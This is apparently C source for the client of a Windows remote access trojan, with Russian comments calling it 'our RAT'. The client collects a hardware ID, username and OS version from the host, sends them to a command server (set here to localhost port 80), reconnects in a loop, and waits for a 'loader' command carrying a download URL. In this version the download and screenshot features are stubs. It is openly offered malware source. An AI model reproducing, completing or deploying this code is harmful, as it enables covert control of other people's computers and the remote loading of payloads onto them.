#include "winsock2.h"
#include "intrin.h"
#include "ntdll.h"
#include "iphlpapi.h"
#include "stdio.h"
#pragma comment(lib, "iphlpapi")
#pragma comment(lib, "ws2_32")
#pragma warning(disable : 4996)

SOCKET Socket;

#define CMD_HADSHAKE	0x00
#define CMD_ONLINE		0x01
#define CMD_OTVET_OK	0x02
#define CMD_OTVET_ER	0x03
#define CMD_SCREEN		0x04
#define CMD_LOADER		0x05

struct CLIENTS
{
	SOCKET SOCKET;
	char USERNAME[100];
	char OSVER[100];
	char HWID[100];
} ;

struct DLE
{
	char URL[1000];
} ;

struct CMDiDATA
{
	DWORD CMD;
	char DATA[4000];
} ;

void GetHwid(char** hwid)
{
	int CPUInfo[4];
	PIP_ADAPTER_INFO pAdapterInfo;
	IP_ADAPTER_INFO AdapterInfo[16];
	DWORD dwBufLen;
	wchar_t mac[8] = { 0x1, 0x2, 0x1, 0x2, 0x1, 0x2, 0x1, 0x2 };
	__cpuid(CPUInfo, 0);
	dwBufLen = sizeof(AdapterInfo);
	GetAdaptersInfo(AdapterInfo, &dwBufLen);
	pAdapterInfo = AdapterInfo;
	do
	{
		int i;
		for (i = 0; i < 8; i++)
		{
			mac[i] = mac[i] + pAdapterInfo->Address[i];
		}
		pAdapterInfo = pAdapterInfo->Next;
	} while (pAdapterInfo);
	*hwid = (char*)realloc(*hwid, 100);
	wsprintfA(*hwid, "%x%x%x%x%x%x%x%x%x%x%x%x",
		CPUInfo[0], CPUInfo[1], CPUInfo[2],
		CPUInfo[3], mac[0], mac[1],
		mac[2], mac[3], mac[4],
		mac[5], mac[6], mac[7]);
}

void GetUsername(char** username)
{
	DWORD size = UNLEN;
	*username = (char*)realloc(*username, UNLEN);
	GetUserNameA(*username, &size);
}

void GetOS(char** os)
{
	PPEBME pPeb = (PPEBME)__readfsdword(0x30);
	*os = (char*)realloc(*os, sizeof(DWORD) * 12);
	wsprintfA(*os, "%d.%d.%d", pPeb->NtMajorVersion, pPeb->NtMinorVersion, pPeb->NtBuildNumber);
}

DWORD WINAPI DLEFUNC(LPVOID url)
{
	char *urlarrdfile = (char*)url;
	printf("na4inau ska4ivanie faula: %s\n", urlarrdfile);
	CMDiDATA indata; //создаем структуру отвечающую за протокол
	memset(&indata, 0, sizeof(CMDiDATA)); //почистим 
	indata.CMD = CMD_OTVET_OK;
	send(Socket, (char*)&indata, sizeof(CMDiDATA), 0);
	return 0;
}

DWORD WINAPI RecvThread(LPVOID param)
{
	while (TRUE)
	{
		CMDiDATA indata; //создаем структуру отвечающую за протокол
		memset(&indata, 0, sizeof(CMDiDATA)); //почистим 

		//recv(Socket, (char*)&indata, sizeof(CMDiDATA), 0); //прием сообщения от cервера
		if (sizeof(CMDiDATA) == recv(Socket, (char*)&indata, sizeof(CMDiDATA), 0)) //прием сообщения от cервера
		{
			switch (indata.CMD)
			{
				case CMD_LOADER://если indata.cmd == CMD_LOADER
				{
					DLE dle; //инициализируем структуру DLE
					memset(&dle, 0, sizeof(DLE)); //очищаем ее
					memcpy(&dle, indata.DATA, sizeof(indata.DATA)); //и копируем в нее indata.DATA
					printf("url: %s\n", dle.URL); //напечатаем пришедший урл
					CreateThread(NULL, 0, DLEFUNC, (LPVOID)dle.URL, 0, 0);
					break;
				}
				default:
					break;
			}
		}
		else {
			if (10054 == GetLastError())
			{
				closesocket(Socket);
				return 0;
			}
			Sleep(1000);
		}	
	}
	return 0;
}

//будущая точка входа нашего ратника
int CALLBACK WinMain(HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR lpCmdLine,
	int nCmdShow)
{
	AllocConsole();

	freopen("CONIN$", "r", stdin);
	freopen("CONOUT$", "w", stdout);
	freopen("CONOUT$", "w", stderr);

	SetConsoleTitleA("RAT");

	//инициализируем структуры винсока
	struct WSAData wsaData;
	WORD DLLVersion = MAKEWORD(2, 1);
	WSAStartup(DLLVersion, &wsaData);
start:
	SOCKADDR_IN ServerAddr;
	Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	ServerAddr.sin_family = AF_INET;
	//задаем конект на локалхост к восьмидесятому порту
	ServerAddr.sin_port = htons(80);
	ServerAddr.sin_addr.s_addr = inet_addr("127.0.0.1");
	//подключаемся к серверу!!!

	if (connect(Socket, (SOCKADDR*)&ServerAddr, sizeof(ServerAddr)) == 0)
	{
		//если мы подключились то передаем хендшейк:)
		CMDiDATA indata; //создаем структуру отвечающую за протокол
		CLIENTS client; //создаем структуру отвечающую за инфу о клиенте
		memset(&indata, 0, sizeof(CMDiDATA)); //почистим 
		memset(&client, 0, sizeof(CLIENTS)); //почистим
		
		char* hwid = (char*)malloc(0);
		char* user = (char*)malloc(0);
		char* os = (char*)malloc(0);

		GetHwid(&hwid);
		GetUsername(&user);
		GetOS(&os);

		memcpy(client.HWID, hwid, sizeof(client.HWID));
		memcpy(client.USERNAME, user, sizeof(client.USERNAME));
		memcpy(client.OSVER, os, sizeof(client.OSVER));
		indata.CMD = CMD_HADSHAKE;
		memcpy(indata.DATA, &client, sizeof(CLIENTS));
		send(Socket, (char*)&indata, sizeof(CMDiDATA), 0);
		printf("sended data :: %s %s %s %s\n", client.HWID, client.OSVER, client.USERNAME);
		HANDLE RECV = CreateThread(NULL, 0, RecvThread, NULL, 0, 0); //создаем тред который будет бесконечно принимать сообщения от сервера
		WaitForSingleObject(RECV, INFINITE); //Бесконечно ожидаем пока этот тред работает...
		
		free(hwid);
		free(user);
		free(os);
	}
	Sleep(10000);
	goto start;
}
